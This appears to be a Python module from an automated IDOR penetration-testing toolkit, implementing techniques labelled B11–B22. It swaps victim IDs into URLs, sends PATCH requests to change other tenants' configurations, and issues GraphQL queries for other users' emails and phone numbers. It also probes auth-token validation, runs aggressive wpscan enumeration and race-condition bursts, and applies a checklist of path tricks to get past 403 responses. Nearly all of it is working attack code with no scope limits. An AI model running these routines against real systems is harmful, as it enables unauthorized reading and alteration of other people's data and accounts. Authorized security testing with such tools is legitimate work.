"""
idor_testing_advanced2.py — Remaining IDOR techniques (complete the methodology).

Implements:
  B11. Configuration & Infrastructure IDOR
  B12. Lifecycle State Mismatch (UI vs API)
  B13. GraphQL Nested Data
  B14. Auth Validation Logic (which param is trusted?)
  B15. Error-Based Parameter Disclosure (curl automated)
  B16. clairvoyance (GraphQL schema introspection)
  B17. wpscan (WordPress enumeration)
  B18. Intermittent / Race Conditions
  B19. HPP with URL + Body together
"""
import json
import re
import subprocess
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from idor_utils import (
    C, G, Y, R, M, BOLD, RST, DIM,
    curl_request, fetch, fetch_json, load_lines, save_lines,
    run_tool, tool_available,
)


# ═══════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════
def _is_sensitive_field(body):
    if not body:
        return False
    patterns = [
        r'"(email|phone|address|ssn|dob|salary|balance|token|secret|password)"\s*:',
        r'"user[_-]?id"\s*:\s*\d+',
        r'"is[_-]?admin"\s*:\s*(true|false)',
        r'"(api[_-]?key|auth[_-]?token|jwt|access[_-]?token)"\s*:',
    ]
    return any(re.search(p, body, re.IGNORECASE) for p in patterns)


def _extract_url_id(url):
    try:
        path = urlparse(url).path
    except Exception:
        return None
    matches = re.findall(r'/(\d+)(?:/|$|\?)', path)
    if not matches:
        return None
    try:
        return int(matches[-1])
    except (ValueError, IndexError):
        return None


# ═══════════════════════════════════════════════════════════
# B11. Configuration & Infrastructure IDOR
# ═══════════════════════════════════════════════════════════
INFRA_KEYWORDS = [
    "project", "workspace", "deployment", "config", "settings",
    "hosting", "instance", "server", "cluster", "node", "pod",
    "webhook", "secret", "credential", "integration", "hook",
    "pipeline", "build", "deploy", "environment", "tenant",
]

INFRA_SENSITIVE_KEYS = [
    "machineType", "instanceSize", "cpu", "memory", "auth_enabled",
    "port", "dnsAutogen", "authentication", "public", "private",
    "region", "zone", "billing", "plan", "tier", "quota",
]


def test_config_idor(url, own_id, victim_id, cookies=None, headers=None):
    """Test if we can access/modify infrastructure configs of another org."""
    findings = []

    # Only proceed if URL looks infrastructure-related
    url_lower = url.lower()
    if not any(k in url_lower for k in INFRA_KEYWORDS):
        return findings

    if not own_id or not victim_id:
        return findings

    target_url = url.replace(str(own_id), str(victim_id), 1)
    if target_url == url:
        return findings

    h = dict(headers or {})
    h["Content-Type"] = "application/json"

    # GET attempt
    r_get = curl_request(target_url, method="GET", cookies=cookies, headers=headers, timeout=10)
    if r_get["status"] == 200 and r_get.get("body"):
        body = r_get["body"]
        if any(re.search(r'"' + k + r'"\s*:', body) for k in INFRA_SENSITIVE_KEYS):
            findings.append({
                "type": "idor-config-read",
                "url": target_url,
                "status": r_get["status"],
                "reason": "Infrastructure config readable across tenants",
                "confidence": "high",
                "preview": body[:300],
            })

    # PATCH attempt (modify port/cpu)
    try:
        body_data = json.loads(r_get.get("body", "{}"))
        if isinstance(body_data, dict):
            data = body_data.get("data", body_data)
            if isinstance(data, dict) and "port" in data:
                test_payload = {"port": 8443}
                r_patch = curl_request(
                    target_url, method="PATCH", cookies=cookies, headers=h,
                    data=json.dumps(test_payload), timeout=10
                )
                if r_patch["status"] in (200, 204):
                    findings.append({
                        "type": "idor-config-write",
                        "url": target_url,
                        "method": "PATCH",
                        "reason": "Infrastructure config writable across tenants",
                        "confidence": "high",
                    })
    except Exception:
        pass

    return findings


# ═══════════════════════════════════════════════════════════
# B12. Lifecycle State Mismatch (UI vs API)
# ═══════════════════════════════════════════════════════════
def test_lifecycle_mismatch(url, cookies=None, headers=None):
    """
    Test if API returns data for resources that UI marks deleted/expired.
    """
    findings = []
    url_lower = url.lower()

    # Only for URLs with lifecycle keywords
    if not any(k in url_lower for k in ("delete", "archive", "expire", "inactive", "draft", "revoke")):
        return findings

    # Get via API
    r = fetch(url, timeout=10, headers=headers)
    if r["status"] != 200 or not r["body"]:
        return findings

    body_lower = r["body"].lower()
    # If API returns data mentioning deleted/archived/expired
    for marker in ["deleted", "archived", "expired", "inactive", "revoked"]:
        if f'"{marker}"' in body_lower or f'": true' in body_lower and marker in body_lower:
            findings.append({
                "type": "lifecycle-mismatch",
                "url": url,
                "reason": f"API returns data for resource marked as '{marker}'",
                "confidence": "medium",
                "preview": r["body"][:200],
            })
            break

    return findings


# ═══════════════════════════════════════════════════════════
# B13. GraphQL Nested Data
# ═══════════════════════════════════════════════════════════
GRAPHQL_NESTED_QUERIES = [
    # Basic user query
    '{"query":"{ user(id: VICTIM_ID) { id email phone address } }"}',
    # Nested relationships
    '{"query":"{ user(id: VICTIM_ID) { id email team { members { email phone } } } }"}',
    # Introspection
    '{"query":"{ __schema { types { name fields { name } } } }"}',
    # Admin fields attempt
    '{"query":"{ user(id: VICTIM_ID) { id email role permissions isAdmin } }"}',
    # Order/payment nested
    '{"query":"{ user(id: VICTIM_ID) { orders { id total items { name price } } } }"}',
]


def test_graphql_nested(urls_graphql, victim_id, cookies=None, headers=None):
    """
    Test GraphQL nested data exposure.
    urls_graphql: list of GraphQL endpoints
    """
    findings = []
    if not urls_graphql or victim_id is None:
        return findings

    h = dict(headers or {})
    h["Content-Type"] = "application/json"

    for gql_url in urls_graphql[:5]:
        # Introspection test
        intro_payload = {"query": "{ __schema { queryType { name } } }"}
        r = curl_request(
            gql_url, method="POST", cookies=cookies, headers=h,
            data=json.dumps(intro_payload), timeout=10
        )
        if r["status"] == 200 and r.get("body"):
            body = r["body"]
            if "__schema" in body or "queryType" in body:
                findings.append({
                    "type": "graphql-introspection",
                    "url": gql_url,
                    "reason": "GraphQL introspection enabled (schema exposed)",
                    "confidence": "medium",
                })

        # Nested data queries
        for query_template in GRAPHQL_NESTED_QUERIES[1:4]:
            payload_str = query_template.replace("VICTIM_ID", str(victim_id))
            try:
                payload = json.loads(payload_str)
            except Exception:
                continue

            r2 = curl_request(
                gql_url, method="POST", cookies=cookies, headers=h,
                data=json.dumps(payload), timeout=10
            )
            if r2["status"] == 200 and r2.get("body"):
                body = r2["body"]
                # If response has actual data (not just errors)
                if '"data"' in body and _is_sensitive_field(body):
                    findings.append({
                        "type": "graphql-nested-idor",
                        "url": gql_url,
                        "payload": payload_str,
                        "reason": "GraphQL nested query returns another user's data",
                        "confidence": "high",
                        "preview": body[:300],
                    })
                    break

    return findings


# ═══════════════════════════════════════════════════════════
# B14. Auth Validation Logic
# ═══════════════════════════════════════════════════════════
def test_auth_validation_logic(url, session, own_id, victim_id, cookies=None, headers=None):
    """
    Determine WHICH parameter the server actually trusts for auth.
    Tests: change ONE param at a time, see which one is really validated.
    """
    findings = []
    if not session:
        return findings

    base_headers = dict(session.get("token_headers", {}) or {})
    base_cookies = session.get("cookies") or cookies

    # Baseline (valid session, own ID)
    r_base = curl_request(url, cookies=base_cookies, headers=base_headers, timeout=10)
    if r_base["status"] != 200:
        return findings

    # Test A: invalid token, valid cookie (if both exist)
    if base_headers.get("Authorization") and base_cookies:
        bad_headers = dict(base_headers)
        bad_headers["Authorization"] = "Bearer INVALID_TOKEN_12345"
        r = curl_request(url, cookies=base_cookies, headers=bad_headers, timeout=8)
        if r["status"] == 200:
            findings.append({
                "type": "auth-token-not-validated",
                "url": url,
                "reason": "Invalid Authorization token accepted (token not validated)",
                "confidence": "high",
            })

    # Test B: no token, valid cookie
    if base_cookies:
        r = curl_request(url, cookies=base_cookies, timeout=8)
        if r["status"] == 200:
            findings.append({
                "type": "auth-header-not-required",
                "url": url,
                "reason": "Request accepted without Authorization header",
                "confidence": "medium",
            })

    # Test C: valid token, no cookie
    if base_headers:
        r = curl_request(url, headers=base_headers, timeout=8)
        if r["status"] == 200:
            findings.append({
                "type": "auth-cookie-not-required",
                "url": url,
                "reason": "Request accepted without cookies",
                "confidence": "medium",
            })

    return findings


# ═══════════════════════════════════════════════════════════
# B15. Error-Based Parameter Disclosure
# ═══════════════════════════════════════════════════════════
ERROR_MARKERS = [
    r"missing\s+parameter[:\s]+([a-zA-Z_][a-zA-Z0-9_]*)",
    r"required\s+parameter[:\s]+([a-zA-Z_][a-zA-Z0-9_]*)",
    r"parameter\s+([a-zA-Z_][a-zA-Z0-9_]*)\s+is\s+required",
    r"expected\s+([a-zA-Z_][a-zA-Z0-9_]*)",
    r"missing\s+([a-zA-Z_][a-zA-Z0-9_]*)\s+field",
    r"\"param\":\s*\"([a-zA-Z_][a-zA-Z0-9_]*)\"",
    r"\"missing\":\s*\[\s*\"([a-zA-Z_][a-zA-Z0-9_]*)\"",
    r"\"required\":\s*\[\s*\"([a-zA-Z_][a-zA-Z0-9_]*)\"",
]


def test_error_based_disclosure(endpoint, cookies=None, headers=None):
    """
    Send incomplete request → extract parameter names from error responses.
    Automates the Burp Suite manual technique.
    """
    findings = []
    h = dict(headers or {})

    # 1. GET without params
    r = fetch(endpoint, timeout=8, headers=headers)
    if r["status"] in (400, 422, 500) and r["body"]:
        body = r["body"]
        for pattern in ERROR_MARKERS:
            matches = re.findall(pattern, body, re.IGNORECASE)
            if matches:
                findings.append({
                    "type": "error-param-disclosure",
                    "url": endpoint,
                    "method": "GET",
                    "params": list(set(matches)),
                    "reason": f"Error reveals required params: {matches}",
                    "confidence": "medium",
                    "preview": body[:300],
                })
                break

    # 2. POST with empty JSON body
    h["Content-Type"] = "application/json"
    r2 = curl_request(
        endpoint, method="POST", cookies=cookies, headers=h,
        data="{}", timeout=8
    )
    if r2["status"] in (400, 422, 500) and r2.get("body"):
        body = r2["body"]
        for pattern in ERROR_MARKERS:
            matches = re.findall(pattern, body, re.IGNORECASE)
            if matches:
                findings.append({
                    "type": "error-param-disclosure",
                    "url": endpoint,
                    "method": "POST",
                    "params": list(set(matches)),
                    "reason": f"Error reveals required params: {matches}",
                    "confidence": "medium",
                    "preview": body[:300],
                })
                break

    # 3. POST with empty body
    r3 = curl_request(
        endpoint, method="POST", cookies=cookies, headers=h,
        data="", timeout=8
    )
    if r3["status"] in (400, 422, 500) and r3.get("body"):
        body = r3["body"]
        for pattern in ERROR_MARKERS:
            matches = re.findall(pattern, body, re.IGNORECASE)
            if matches:
                findings.append({
                    "type": "error-param-disclosure",
                    "url": endpoint,
                    "method": "POST (empty)",
                    "params": list(set(matches)),
                    "reason": f"Error reveals required params: {matches}",
                    "confidence": "medium",
                    "preview": body[:300],
                })
                break

    return findings


# ═══════════════════════════════════════════════════════════
# B16. clairvoyance (GraphQL schema)
# ═══════════════════════════════════════════════════════════
def run_clairvoyance(graphql_urls, idir):
    """Run clairvoyance on GraphQL endpoints to recover schema (if installed)."""
    if not tool_available("clairvoyance"):
        print(f"    {Y}[!]{RST} clairvoyance not installed - skipping")
        return []

    results = []
    for gql in graphql_urls[:3]:
        safe = re.sub(r'[^a-zA-Z0-9]', '_', gql)[:50]
        out = Path(idir) / f"clairvoyance_{safe}.json"
        cmd = f"clairvoyance {gql} -o {out} 2>/dev/null"
        run_tool(cmd, timeout=120)
        if out.exists() and out.stat().st_size > 0:
            results.append(str(out))
    return results


# ═══════════════════════════════════════════════════════════
# B17. wpscan (WordPress)
# ═══════════════════════════════════════════════════════════
def run_wpscan(target_url, idir, api_token=None):
    """Run wpscan on WordPress targets."""
    if not tool_available("wpscan"):
        print(f"    {Y}[!]{RST} wpscan not installed - skipping")
        return None

    out = Path(idir) / "wpscan_results.txt"
    token_arg = f"--api-token {api_token}" if api_token else ""
    cmd = (f"wpscan --url {target_url} --enumerate p,t,vp,vt "
           f"--plugins-detection aggressive --random-user-agent "
           f"--disable-tls-checks {token_arg} -o {out} 2>/dev/null")
    run_tool(cmd, timeout=600)
    if out.exists() and out.stat().st_size > 0:
        return str(out)
    return None


# ═══════════════════════════════════════════════════════════
# B18. Intermittent / Race Conditions
# ═══════════════════════════════════════════════════════════
def test_race_condition(url, method="GET", cookies=None, headers=None,
                        concurrency=10, attempts=5):
    """
    Send N parallel requests. Mixed responses may indicate race condition.
    """
    findings = []

    def _one_request():
        return curl_request(url, method=method, cookies=cookies, headers=headers, timeout=8)

    for attempt in range(attempts):
        results = []
        with ThreadPoolExecutor(max_workers=concurrency) as ex:
            futures = [ex.submit(_one_request) for _ in range(concurrency)]
            for fut in as_completed(futures):
                try:
                    results.append(fut.result())
                except Exception:
                    pass

        statuses = [r.get("status", 0) for r in results]
        unique = set(statuses)
        # If mixed 200/500 or 200/403 → suspicious
        if len(unique) > 1:
            if 200 in unique and any(s in (500, 502, 503) for s in unique):
                findings.append({
                    "type": "race-condition",
                    "url": url,
                    "method": method,
                    "statuses": list(unique),
                    "reason": f"Race condition: mixed responses {sorted(unique)}",
                    "confidence": "medium",
                })
                break
            if 200 in unique and any(s in (401, 403, 429) for s in unique):
                findings.append({
                    "type": "race-condition-suspicious",
                    "url": url,
                    "method": method,
                    "statuses": list(unique),
                    "reason": f"Inconsistent access: {sorted(unique)}",
                    "confidence": "low",
                })
                break

    return findings


# ═══════════════════════════════════════════════════════════
# B19. HPP URL + Body
# ═══════════════════════════════════════════════════════════
def test_hpp_url_and_body(url, own_id, victim_id, cookies=None, headers=None):
    """
    HPP combined: URL query + Body both contain the ID param.
    Server may validate one location but execute on the other.
    """
    findings = []
    h = dict(headers or {})
    h["Content-Type"] = "application/json"

    # Ensure URL has id param (with own_id)
    p = urlparse(url)
    q = parse_qs(p.query, keep_blank_values=True)
    id_param = None
    for k in q:
        if k in ("id", "user_id", "userId", "account_id", "order_id"):
            id_param = k
            break
    if not id_param:
        id_param = "id"
        q[id_param] = [str(own_id)]
    else:
        q[id_param] = [str(own_id)]

    new_url = urlunparse((p.scheme, p.netloc, p.path, p.params,
                          urlencode(q, doseq=True), p.fragment))

    # Body has victim_id
    body = {id_param: victim_id, "id": victim_id, "user_id": victim_id}

    r = curl_request(new_url, method="POST", cookies=cookies, headers=h,
                     data=json.dumps(body), timeout=10)

    if r["status"] in (200, 201, 204) and _is_sensitive_field(r.get("body", "")):
        findings.append({
            "type": "hpp-url-body",
            "url": new_url,
            "body": json.dumps(body),
            "reason": "URL and body both have ID — possible conflict bypass",
            "confidence": "medium",
            "preview": r.get("body", "")[:200],
        })

    return findings


# ═══════════════════════════════════════════════════════════
# MAIN ORCHESTRATOR
# ═══════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════
# B20. Rate Limiting Check on IDOR Endpoints
# ═══════════════════════════════════════════════════════════
def test_rate_limit_idor(url, cookies=None, headers=None, count=30,
                         delay=0.0, threshold_ms=3000):
    findings = []
    if not url:
        return findings
    statuses, times, first_429_at = [], [], None
    for i in range(count):
        t0 = time.time()
        try:
            r = curl_request(url, method="GET", cookies=cookies,
                             headers=headers, timeout=10)
        except Exception:
            times.append(0); statuses.append(0); continue
        dt = (time.time() - t0) * 1000
        times.append(dt); statuses.append(r.get("status", 0))
        if r.get("status") == 429 and first_429_at is None:
            first_429_at = i + 1; break
        if delay:
            time.sleep(delay)
    if not times:
        return findings
    from collections import Counter
    status_counter = Counter(statuses)
    avg_ms = sum(times) / len(times) if times else 0
    if first_429_at is None and status_counter.get(200, 0) > count * 0.7:
        findings.append({
            "type": "rate-limit-missing", "url": url,
            "reason": f"{count} rapid requests, no 429. Mass enumeration possible.",
            "confidence": "high", "statuses": dict(status_counter),
            "avg_ms": round(avg_ms, 1),
        })
    if times and max(times) > threshold_ms:
        findings.append({
            "type": "rate-limit-throttling", "url": url,
            "reason": f"Response time increased up to {int(max(times))}ms",
            "confidence": "medium", "avg_ms": round(avg_ms, 1),
            "max_ms": round(max(times), 1),
        })
    return findings


# ═══════════════════════════════════════════════════════════
# B21. Intermittent Behavior / Race Conditions
# ═══════════════════════════════════════════════════════════
def test_intermittent_behavior(url, cookies=None, headers=None, tries=15):
    findings = []
    if not url:
        return findings
    from collections import Counter
    status_counter = Counter(); bodies = {}
    for _ in range(tries):
        try:
            r = curl_request(url, method="GET", cookies=cookies,
                             headers=headers, timeout=8)
        except Exception:
            status_counter[0] += 1; continue
        st = r.get("status", 0)
        status_counter[st] += 1
        if st == 200 and "200" not in bodies:
            bodies["200"] = (r.get("body") or "")[:300]
    if status_counter.get(200, 0) >= 2 and status_counter.get(500, 0) >= 2:
        findings.append({
            "type": "intermittent-200-500", "url": url,
            "reason": f"Mixed 200/500 over {tries} tries — load balancer or race",
            "confidence": "high", "statuses": dict(status_counter),
            "sample_200": bodies.get("200", ""),
        })
    elif status_counter.get(200, 0) >= 2 and status_counter.get(403, 0) >= 2:
        findings.append({
            "type": "intermittent-200-403", "url": url,
            "reason": f"Mixed 200/403 — auth bypass intermittent",
            "confidence": "high", "statuses": dict(status_counter),
        })
    elif status_counter.get(200, 0) >= 1 and sum(
            v for k, v in status_counter.items() if k in (401, 403)) >= 5:
        findings.append({
            "type": "intermittent-rare-200", "url": url,
            "reason": f"Rare 200 in {tries} tries — inconsistent auth",
            "confidence": "medium", "statuses": dict(status_counter),
        })
    return findings


# ═══════════════════════════════════════════════════════════
# B22. Rule-Based Bypass Checklist Execution
# ═══════════════════════════════════════════════════════════
BYPASS_TECHNIQUES = [
    ("trailing_slash",    lambda u: u.rstrip("/") + "/"),
    ("double_slash",      lambda u: u.replace("://", ":///") if "://" in u else u),
    ("path_dot",          lambda u: u.replace("/api/", "/./api/")),
    ("path_updir",        lambda u: u.replace("/api/", "/api/../api/")),
    ("uppercase",         lambda u: u.replace("/api/", "/API/")),
    ("mixedcase",         lambda u: u.replace("/api/", "/Api/")),
    ("null_byte",         lambda u: u + "%00"),
    ("semicolon",         lambda u: u + ";"),
    ("json_ext",          lambda u: u + ".json"),
    ("xml_ext",           lambda u: u + ".xml"),
    ("html_ext",          lambda u: u + ".html"),
    ("wildcard",          lambda u: re.sub(r"/\d+(?=/|$)", "/*", u, count=1)),
    ("delete_id",         lambda u: re.sub(r"/\d+(?=/|$)", "", u, count=1)),
    ("url_encode_id",     lambda u: re.sub(r"/(\d)", r"/%3\1", u, count=1)),
]


def execute_bypass_checklist(url, cookies=None, headers=None, method="GET"):
    findings = []
    if not url:
        return findings
    try:
        base = curl_request(url, method=method, cookies=cookies,
                            headers=headers, timeout=8)
    except Exception:
        return findings
    base_status = base.get("status", 0)
    if base_status not in (401, 403, 405, 429):
        return findings
    for name, mod in BYPASS_TECHNIQUES:
        try:
            new_url = mod(url)
        except Exception:
            continue
        if not new_url or new_url == url:
            continue
        try:
            r = curl_request(new_url, method=method, cookies=cookies,
                             headers=headers, timeout=8)
        except Exception:
            continue
        if r.get("status") in (200, 201, 202, 204) and len(r.get("body") or "") > 30:
            findings.append({
                "type": f"bypass-{name}", "url": new_url,
                "original_url": url,
                "reason": f"Bypass via {name}: {base_status} → {r['status']}",
                "confidence": "high", "status": r["status"],
                "preview": (r.get("body") or "")[:200],
            })
    return findings



def run_all_advanced2(candidates, session_a, session_b, graphql_urls, idir,
                      target_url=None, api_token=None):
    """Run all B11-B19 techniques."""
    idir = Path(idir)
    idir.mkdir(parents=True, exist_ok=True)

    confirmed = []
    suspicious = []

    a_uid = (session_a or {}).get("user_id")
    b_uid = (session_b or {}).get("user_id")
    a_cookies = (session_a or {}).get("cookies")
    a_headers = (session_a or {}).get("token_headers", {})

    print(f"\n{BOLD}{C}  IDOR Advanced Testing (B11-B19){RST}\n")

    # ── B11. Configuration & Infrastructure IDOR ──
    print(f"{BOLD}[B11] Configuration & Infrastructure IDOR{RST}")
    b11_count = 0
    for url in candidates[:20]:
        if not any(k in url.lower() for k in INFRA_KEYWORDS):
            continue
        try:
            fs = test_config_idor(url, a_uid, b_uid, cookies=a_cookies, headers=a_headers)
            for f in fs:
                confirmed.append(f)
                b11_count += 1
        except Exception:
            pass
    print(f"    {G}+{RST} {b11_count} findings")

    # ── B12. Lifecycle State Mismatch ──
    print(f"{BOLD}[B12] Lifecycle State Mismatch{RST}")
    b12_count = 0
    for url in candidates[:30]:
        try:
            fs = test_lifecycle_mismatch(url, cookies=a_cookies, headers=a_headers)
            for f in fs:
                suspicious.append(f)
                b12_count += 1
        except Exception:
            pass
    print(f"    {G}+{RST} {b12_count} findings")

    # ── B13. GraphQL Nested Data ──
    print(f"{BOLD}[B13] GraphQL Nested Data{RST}")
    b13_count = 0
    try:
        fs = test_graphql_nested(graphql_urls, b_uid, cookies=a_cookies, headers=a_headers)
        for f in fs:
            confirmed.append(f)
            b13_count += 1
    except Exception as e:
        print(f"    {Y}[!]{RST} GraphQL test failed: {e}")
    print(f"    {G}+{RST} {b13_count} findings")

    # ── B14. Auth Validation Logic ──
    print(f"{BOLD}[B14] Auth Validation Logic{RST}")
    b14_count = 0
    for url in candidates[:10]:
        try:
            fs = test_auth_validation_logic(url, session_a, a_uid, b_uid)
            for f in fs:
                suspicious.append(f)
                b14_count += 1
        except Exception:
            pass
    print(f"    {G}+{RST} {b14_count} findings")

    # ── B15. Error-Based Parameter Disclosure ──
    print(f"{BOLD}[B15] Error-Based Parameter Disclosure{RST}")
    b15_count = 0
    for url in candidates[:20]:
        try:
            fs = test_error_based_disclosure(url, cookies=a_cookies, headers=a_headers)
            for f in fs:
                suspicious.append(f)
                b15_count += 1
        except Exception:
            pass
    print(f"    {G}+{RST} {b15_count} findings")

    # ── B16. clairvoyance (GraphQL schema) ──
    print(f"{BOLD}[B16] clairvoyance (GraphQL schema){RST}")
    clair_results = []
    try:
        clair_results = run_clairvoyance(graphql_urls, idir)
    except Exception:
        pass
    print(f"    {G}+{RST} {len(clair_results)} schemas recovered")

    # ── B17. wpscan ──
    print(f"{BOLD}[B17] wpscan (WordPress){RST}")
    wpscan_result = None
    if target_url:
        # Only run if WP hints detected in candidates
        has_wp = any("wp-json" in u or "wp-content" in u or "wp-login" in u for u in candidates)
        if has_wp:
            try:
                wpscan_result = run_wpscan(target_url, idir, api_token)
                print(f"    {G}+{RST} wpscan completed")
            except Exception:
                print(f"    {Y}[!]{RST} wpscan failed")
        else:
            print(f"    {DIM}No WordPress hints detected{RST}")

    # ── B18. Race Conditions ──
    print(f"{BOLD}[B18] Race Conditions{RST}")
    b18_count = 0
    # Test only on state-changing endpoints
    state_urls = [u for u in candidates[:10]
                  if any(k in u.lower() for k in ("update", "edit", "delete", "create", "change"))]
    for url in state_urls[:3]:
        try:
            fs = test_race_condition(url, method="GET", cookies=a_cookies, headers=a_headers)
            for f in fs:
                suspicious.append(f)
                b18_count += 1
        except Exception:
            pass
    print(f"    {G}+{RST} {b18_count} findings")

    # ── B19. HPP URL + Body ──
    print(f"{BOLD}[B19] HPP URL + Body{RST}")
    b19_count = 0
    for url in candidates[:10]:
        try:
            fs = test_hpp_url_and_body(url, a_uid, b_uid, cookies=a_cookies, headers=a_headers)
            for f in fs:
                confirmed.append(f)
                b19_count += 1
        except Exception:
            pass
    print(f"    {G}+{RST} {b19_count} findings")

    # ── Save results ──
    if confirmed:
        save_lines(idir / "advanced2_confirmed.json", [json.dumps(f) for f in confirmed])
    if suspicious:
        save_lines(idir / "advanced2_suspicious.json", [json.dumps(f) for f in suspicious])

    # ═══════════════════════════════════════════════════════════
    # B20. Rate Limiting Check
    # ═══════════════════════════════════════════════════════════
    print("\n[B20] Rate Limiting Check")
    b20_count = 0
    for url in candidates[:5]:
        try:
            rl = test_rate_limit_idor(
                url,
                cookies=(session_a or {}).get("cookies"),
                headers=(session_a or {}).get("headers"),
                count=20, threshold_ms=5000,
            )
            if rl:
                confirmed.extend(rl)
                for f in rl:
                    print(f"    ! {f['type']}: {url[:80]}")
                b20_count += len(rl)
        except Exception as e:
            print(f"    error: {e}")
    print(f"    + Tested: {len(candidates[:5])} | Findings: {b20_count}")

    # ═══════════════════════════════════════════════════════════
    # B21. Intermittent Behavior
    # ═══════════════════════════════════════════════════════════
    print("\n[B21] Intermittent Behavior")
    b21_count = 0
    for url in candidates[:5]:
        try:
            int_f = test_intermittent_behavior(
                url,
                cookies=(session_a or {}).get("cookies"),
                headers=(session_a or {}).get("headers"),
                tries=12,
            )
            if int_f:
                confirmed.extend(int_f)
                for f in int_f:
                    print(f"    ! {f['type']}: {url[:80]}")
                b21_count += len(int_f)
        except Exception:
            pass
    print(f"    + Tested: {len(candidates[:5])} | Findings: {b21_count}")

    # ═══════════════════════════════════════════════════════════
    # B22. Rule-Based Bypass Checklist
    # ═══════════════════════════════════════════════════════════
    print("\n[B22] Bypass Checklist (rule-based)")
    b22_count = 0
    blocked_urls = []
    for url in candidates[:10]:
        try:
            r = curl_request(
                url, method="GET",
                cookies=(session_a or {}).get("cookies"),
                headers=(session_a or {}).get("headers"),
                timeout=6,
            )
            if r.get("status") in (401, 403, 405):
                blocked_urls.append(url)
        except Exception:
            pass
    for url in blocked_urls:
        try:
            byp = execute_bypass_checklist(
                url,
                cookies=(session_a or {}).get("cookies"),
                headers=(session_a or {}).get("headers"),
            )
            if byp:
                confirmed.extend(byp)
                for f in byp:
                    print(f"    ! {f['type']}: {f['url'][:80]}")
                b22_count += len(byp)
        except Exception:
            pass
    print(f"    + Tested: {len(blocked_urls)} blocked URLs | Findings: {b22_count}")

    return {"confirmed": confirmed, "suspicious": suspicious}


if __name__ == "__main__":
    print("=== idor_testing_advanced2 standalone tests ===\n")

    # Test 1: helper
    print("[1] URL ID extraction:")
    for u in ["http://x.com/api/Users/28", "http://x.com/order/123", "http://x.com/"]:
        print(f"    {u:40} -> {_extract_url_id(u)}")

    # Test 2: B11 infra keywords
    print("\n[2] Infra keywords:")
    print(f"    {INFRA_KEYWORDS[:5]}...")

    # Test 3: error markers
    print("\n[3] Error markers count:")
    print(f"    {len(ERROR_MARKERS)} patterns")

    # Test 4: HPP URL+Body
    print("\n[4] HPP URL+Body test (dry):")
    print(f"    URL: http://x.com/api?id=27")
    print(f"    Body: {{\"id\": 28}}")
    print(f"    → URL has 27, Body has 28 = conflict test")
